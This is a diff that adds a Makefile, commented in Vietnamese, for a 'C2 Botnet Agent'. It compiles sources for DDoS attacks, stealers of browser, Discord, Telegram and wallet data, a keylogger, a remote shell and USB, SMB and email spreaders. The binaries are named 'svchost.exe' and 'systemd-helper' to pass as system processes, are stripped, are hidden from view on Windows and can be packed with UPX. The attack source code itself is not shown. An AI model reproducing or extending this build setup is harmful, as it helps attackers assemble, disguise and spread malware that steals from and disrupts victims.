@@ -1,0 +1,145 @@
+# =============================================
+# Makefile cho C2 Botnet Agent
+# Ho tro: Windows (MinGW), Linux, MacOS
+# =============================================
+
+# Trinh bien dich
+CC = gcc
+CXX = g++
+
+# Thu muc
+SRC_DIR = .
+BUILD_DIR = build
+BIN_DIR = bin
+
+# Ten file thuc thi
+TARGET_WIN = $(BIN_DIR)/svchost.exe
+TARGET_LINUX = $(BIN_DIR)/systemd-helper
+TARGET_MACOS = $(BIN_DIR)/systemd-helper
+
+# Cac file nguon
+SOURCES = bot_main.c \
+          bot_network.c \
+          bot_crypto.c \
+          bot_evasion.c \
+          bot_persistence.c \
+          ddos_layer7.c \
+          ddos_layer4.c \
+          ddos_layer3.c \
+          stealer_browser.c \
+          stealer_discord.c \
+          stealer_telegram.c \
+          stealer_wallets.c \
+          stealer_files.c \
+          stealer_system.c \
+          remote_shell.c \
+          remote_file.c \
+          remote_screen.c \
+          keylogger.c \
+          spreader_usb.c \
+          spreader_smb.c \
+          spreader_email.c
+
+# Object files
+OBJECTS = $(SOURCES:.c=.o)
+
+# Cac thu vien can thiet
+ifeq ($(OS),Windows_NT)
+    # Windows
+    LIBS = -lws2_32 -lwinhttp -lcrypt32 -lgdi32 -lgdiplus -lole32 -lshlwapi -lnetapi32 -lwlanapi -liphlpapi
+    CFLAGS = -Wall -O2 -s -static -D_WIN32 -DWIN32_LEAN_AND_MEAN
+    LDFLAGS = -static -s
+    TARGET = $(TARGET_WIN)
+else
+    UNAME_S := $(shell uname -s)
+    ifeq ($(UNAME_S),Linux)
+        # Linux
+        LIBS = -lssl -lcrypto -lpthread
+        CFLAGS = -Wall -O2 -s -static -DLINUX
+        LDFLAGS = -static -s
+        TARGET = $(TARGET_LINUX)
+    endif
+    ifeq ($(UNAME_S),Darwin)
+        # MacOS
+        LIBS = -lssl -lcrypto -lpthread
+        CFLAGS = -Wall -O2 -s -DMACOS
+        LDFLAGS = -s
+        TARGET = $(TARGET_MACOS)
+    endif
+endif
+
+# Mac dinh: build tat ca
+all: clean_dir $(TARGET)
+
+# Tao thu muc build
+clean_dir:
+	mkdir -p $(BUILD_DIR) $(BIN_DIR)
+
+# Build cho Windows
+windows:
+	@echo "=== Bien dich cho Windows ==="
+	x86_64-w64-mingw32-gcc -Wall -O2 -s -static \
+		-D_WIN32 -DWIN32_LEAN_AND_MEAN \
+		-o $(TARGET_WIN) $(SOURCES) \
+		-lws2_32 -lwinhttp -lcrypt32 -lgdi32 -lgdiplus -lole32 -lshlwapi -lnetapi32 -lwlanapi -liphlpapi \
+		-mwindows
+	@echo "=== Da tao: $(TARGET_WIN) ==="
+
+# Build cho Linux
+linux:
+	@echo "=== Bien dich cho Linux ==="
+	$(CC) $(CFLAGS) -o $(TARGET_LINUX) $(SOURCES) $(LIBS) $(LDFLAGS)
+	strip $(TARGET_LINUX)
+	@echo "=== Da tao: $(TARGET_LINUX) ==="
+
+# Build cho MacOS
+macos:
+	@echo "=== Bien dich cho MacOS ==="
+	$(CC) $(CFLAGS) -o $(TARGET_MACOS) $(SOURCES) $(LIBS) $(LDFLAGS)
+	strip $(TARGET_MACOS)
+	@echo "=== Da tao: $(TARGET_MACOS) ==="
+
+# Build voi UPX nen (giam kich thuoc)
+upx: $(TARGET)
+	@echo "=== Nen voi UPX ==="
+	upx --best --lzma $(TARGET)
+	@echo "=== Da nen xong ==="
+
+# Build debug (khong strip, co symbol)
+debug:
+	$(CC) -Wall -g -DDEBUG -o $(BIN_DIR)/bot_debug $(SOURCES) $(LIBS)
+	@echo "=== Debug build hoan tat ==="
+
+# Dọn dep
+clean:
+	rm -rf $(BUILD_DIR) $(BIN_DIR) *.o
+	@echo "=== Da don dep ==="
+
+# Xoa hoan toan
+distclean: clean
+	rm -f *.exe *.dll *.so *.dylib
+
+# Hien thi tro giup
+help:
+	@echo "========================================="
+	@echo "  C2 Botnet Agent - Makefile"
+	@echo "========================================="
+	@echo ""
+	@echo "Muc tieu:"
+	@echo "  all      - Build cho OS hien tai"
+	@echo "  windows  - Build cho Windows (MinGW)"
+	@echo "  linux    - Build cho Linux"
+	@echo "  macos    - Build cho MacOS"
+	@echo "  upx      - Nen binary voi UPX"
+	@echo "  debug    - Build debug"
+	@echo "  clean    - Don dep"
+	@echo "  distclean- Don dep hoan toan"
+	@echo "  help     - Hien thi tro giup nay"
+	@echo ""
+	@echo "Vi du:"
+	@echo "  make windows    # Bien dich cho Windows"
+	@echo "  make linux upx  # Bien dich va nen cho Linux"
+	@echo ""
+
+# Pseudo targets
+.PHONY: all windows linux macos upx debug clean distclean help clean_dir
